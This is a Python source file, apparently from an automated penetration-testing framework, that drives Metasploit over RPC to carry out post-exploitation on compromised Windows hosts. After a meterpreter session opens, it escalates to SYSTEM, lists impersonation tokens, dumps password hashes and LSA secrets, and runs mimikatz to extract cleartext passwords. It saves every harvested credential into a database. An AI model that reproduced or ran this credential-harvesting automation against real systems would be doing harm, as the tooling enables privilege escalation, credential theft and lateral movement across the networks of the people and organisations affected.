import msfrpc
import time

def logVal(fn,  val):
        print "{0} :: {1}".format(fn,  val)
        f = open("logs/{0}".format(fn),'a+')
        f.write(val + '\n')
        f.close()

def setupMeterpreter(client, console_id, log_name, init):
    log = []
    for i in init:
        client.call('console.write', [console_id, i + "\n"])
        time.sleep(0.25)
    
    startTime = time.time()
    
    got_meterpreter = False
    while got_meterpreter == False:
        res = client.call('console.read',[console_id])
        
        failure_messages = [ "STATUS_ACCESS_DENIED", "STATUS_LOGON_FAILURE", "Auto-targeting failed", "Invalid SQL Server credentials" ]
        for m in failure_messages:
            if res['data'].find(m) > 0:
                log.append(res['data'])
                logVal(log_name,  res['data'])

                return [False, log]
                
        if len(res['data']) > 0:
            for l in res['data'].split("\n"):
                if l != "":
                    log.append(l.replace("\r",  ""))
                    logVal(log_name,  l.replace("\r",  ""))
        
        if res['prompt'].find("meterpreter") != -1:
            log.append("got meterpreter >")
            logVal(log_name,  "got meterpreter >")
            log.append("")
            logVal(log_name,  "")
            got_meterpreter = True

        time.sleep(1)
        if time.time() - startTime >= 60 * 3:
            log.append("More than three minutes have passed. the meterpreter isn't coming back. calling it")
            logVal(log_name,  "More than three minutes have passed. the meterpreter isn't coming back. calling it")
            return [False, log]

    return [True, log]

def runCommand(client, console_id, log_name, command, expectedTime, timeLimit, completedString, secondRun = False):
    log = []
    notLoaded = False
    completed = False
    completeOnNextCycle = False
    startTime = time.time()

    log.append("meterpreter> {0}".format(command))
    logVal(log_name,  "meterpreter> {0}".format(command))
    client.call('console.write', [console_id, "{0}\n".format(command)])

    time.sleep(expectedTime)
    while completed == False:
        #if completeOnNextCycle == True:
        #    completed = True
        
        if time.time() - startTime >= timeLimit:
            completed = True
            notLoaded = True
         
        res = client.call('console.read',[console_id])
        if res['data'] == "":
            time.sleep(5)
            res = client.call('console.read',[console_id])
        
        if res['data'] == "":
            if completeOnNextCycle == True:
                completed = True
        else:
            for l in res['data'].split("\n"):
                if l != "":
                    log.append(l)
                    logVal(log_name,  l)
                    
                    if l.find("Unknown command: ") != -1:
                        completed = True
                        notLoaded = True
                        break
                    elif l.find("Error running command ") != -1:
                        completed = True
                        notLoaded = True
                        break
                    
                    for s in completedString:
                        if l.find(s) != -1:
                            completeOnNextCycle = True
                            #time.sleep(5)
                    
    log.append("")
    logVal(log_name,  "")

    if notLoaded == True:
        if secondRun == False:
            log.append("error while running command. will try again")
            logVal(log_name,  "error while running command. will try again")
            time.sleep(5)
            for l in runCommand(client, console_id, log_name, command, expectedTime, timeLimit, completedString, True):
                log.append(l)

    return log
        
def parseLSAOutput(params, lsa_log):
    #name = ""
    service = ""
    #ntlm = ""
    current = ""
    #old = ""

    users = []
    in_lsa = False

    for l in lsa_log:
        if l.find("Secret Count") != -1:
            in_lsa = True
        elif in_lsa:
            if l.find(".") == -1:
                in_lsa = False
                break
            #print "lsa_log :: " + l
            if l.find("Name") != -1:
                if service != "" and current != "":
                    #print "found these :: [{0}]\t[{1}]\t[{2}]\t[{3}]\t[{4}]".format(name, service, ntlm, current, old)
                    users.append([service, current])
                #name = l.split(":")[1].strip()
                service = ""
                #ntlm = ""
                current = ""
                #old = ""
            elif l.find("Service") != -1:
                service = l.split(":")[1].strip()
            #elif l.find("NTLM") != -1:
            #    ntlm = l.split(":")[1].strip()
            elif l.find("Current") != -1:
                current = l.split(":")[1].strip()
            #elif l.find("Old") != -1:
            #    old = l.split(":")[1].strip()
    if service != "" and current != "":
        #print "found these :: [{0}]\t[{1}]\t[{2}]\t[{3}]\t[{4}]".format(name, service, ntlm, current, old)
        users.append([service, current])
    return users
        
def runMsf(params, host_id, init, log_name):
    #startTime = time.time()
    log = []
    
    computer_name = ""
    os = ""
    architecture = ""
    system_language = ""
    host_domain = ""
    
    mustMigrate = False
    
    client = msfrpc.Msfrpc({'port':int(params.msf_port)})
    client.login(user=params.msf_user, password=params.msf_pass)
    res = client.call('console.create')
    
    console_id = res['id']
    
    res = setupMeterpreter(client, console_id, log_name, init)
    
    for l in res[1]:
        log.append(l)
    
    if res[0] == True:
        for l in runCommand(client, console_id, log_name, "getuid", 3, 60, [ "username" ]):
            log.append(l)
        
        for l in runCommand(client, console_id, log_name, "sysinfo", 3, 60, [ "Meterpreter" ]):
            log.append(l)
            if l.find("Computer") != -1:
                computer_name = l[l.find("Computer") + 9:].split(":")[1].strip()
            elif l.find("OS") != -1:
                os = l[l.find("OS") + 3:].split(":")[1].strip()
            elif l.find("Architecture") != -1:
                architecture = l[l.find("Architecture") + 13:].split(":")[1].strip()
            elif l.find("System Language") != -1:
                system_language = l[l.find("System Language") + 16:].split(":")[1].strip()
            elif l.find("Domain") != -1:
                host_domain = l[l.find("Domain") + 7:].split(":")[1].strip()
            elif l.find("Meterpreter") != -1:
                if l[l.find("Meterpreter") + 11:].split(":")[1].strip().split("/")[0] != architecture[:3]:
                    mustMigrate = True
            
            sql = "update host_data set computer_name = %s, os = %s, architecture = %s, system_language = %s, domain = %s where id = %s"
            cursor = params.db.cursor()
            cursor.execute(sql, (computer_name, os, architecture, system_language, host_domain, host_id))
            cursor.close()
            
        for l in runCommand(client, console_id, log_name, "getsystem", 3, 60, [ "got system via technique", "Operation failed" ]):
            log.append(l)
            
        for l in runCommand(client, console_id, log_name, "use incognito", 3, 60, [ "success", "extension has already been loaded" ]):
            log.append(l)

        for l in runCommand(client, console_id, log_name, "list_tokens -u", 3, 60, [ "Impersonation Tokens Available" ]):
            log.append(l)
            if l.find("Tokens Available") == -1 and l.find("list_tokens") == -1 and l.find("=====") == -1:
                if l != "":
                    cursor = params.db.cursor()
                    cursor.execute("call addToken(%s, %s)", (host_id, l.strip()))
                    cursor.close()

        foundHashes = False
        for l in runCommand(client, console_id, log_name, "run post/windows/gather/hashdump", 3, 60, [ "Dumping password hashes..." ]):
            log.append(l)
            if foundHashes == True:
                if l != "":
                    info = l.split(":")
                    cursor = params.db.cursor()
                    cursor.execute("call addLocalCredentials(%s, %s, %s, %s, %s)", (host_id, info[0], "", info[2], info[3]))
                    cursor.close()
            if l.find("Dumping password hashes") != -1:
                foundHashes = True

        for l in runCommand(client, console_id, log_name, "use kiwi", 3, 10, [ "success", "extension has already been loaded" ]):
            log.append(l)

        lsa_log = []
        for l in runCommand(client, console_id, log_name, "lsa_dump", 3, 60, [ "NTLM Hash", "SAM Key Count" ]):
            log.append(l)
            lsa_log.append(l)

        for user in parseLSAOutput(params, lsa_log):
            domain = user[0].split("\\")[0].upper()
            username = user[0].split("\\")[1]
            
            if user[0].split("\\")[0].upper() == host_domain.upper():
                cursor = params.db.cursor()
                cursor.execute("call addDomainCreds(%s, %s, %s, %s, %s)",  (params.footprint_id, host_id, domain, username, user[1]))
                cursor.close()
            #TODO: call this function when you find a place to test it
            #else:
            #    print "local creds found: {0} {1}".format(user[0], user[1])

        if mustMigrate == True:
            for l in runCommand(client, console_id, log_name, "run post/windows/manage/smart_migrate", 3, 60,
                                [ "Successfully migrated to process", "Was unable to sucessfully migrate" ]):
                log.append(l)
        
            for l in runCommand(client, console_id, log_name, "getsystem", 3, 60, [ "got system via technique", "Operation failed" ]):
                log.append(l)
        
        #for l in runCommand(client, console_id, log_name, "run post/windows/gather/credentials/credential_collector", 120, 180):
        #    log.append(l)
        #    if l.find("]") > 0:
        #        pass
        #    elif l.find(">") > 0:
        #        pass
        #    elif l.find("Extracted") > 0:
        #        details = l.split(":")
        #        user = details[1][1:]
        #        lm_hash = details[2]
        #        ntlm_hash = details[3]
        #        
        #        cursor = params.db.cursor()
        #        cursor.execute("call addLocalCredentials(%s, %s, %s, %s, %s)", (host_id, user, "", lm_hash, ntlm_hash))
        #        cursor.close()
        #    else:
        #        if l.strip() != "":
        #            cursor = params.db.cursor()
        #            cursor.execute("call addToken(%s, %s)", (host_id, l.strip()))
        #            cursor.close()
        
        for l in runCommand(client, console_id, log_name, "use mimikatz", 3, 60, [ "success." ]):
            log.append(l)
        
        #TODO: these arent getting uploaded. check why
        for l in runCommand(client, console_id, log_name, "mimikatz_command -f sekurlsa::searchPasswords", 3, 60, [ "Error", "erreur", "Access is denied",  "}" ]):
            log.append(l)
            if l[:1] == "[":
                try:
                    details = l.split("{")[1].split("}")[0].split(";")
                    username = details[0][1:-1]
                    domain   = details[1][1:-1]
                    password = details[2][1:-1]
                    
                    if (domain == computer_name):
                        cursor = params.db.cursor()
                        #TODO: check if the hostname is the same as the domain
                        #to differentiate between local and domain creds
                        cursor.execute("call addLocalCredentials(%s, %s, %s, %s, %s)", (host_id, username, password, "", ""))
                        cursor.close()
                except:
                    print "error extracting creds from :" + l
        
        for l in runCommand(client, console_id, log_name, "exit", 3, 5, [ "closed" ]):
            log.append(l)
            
    return log
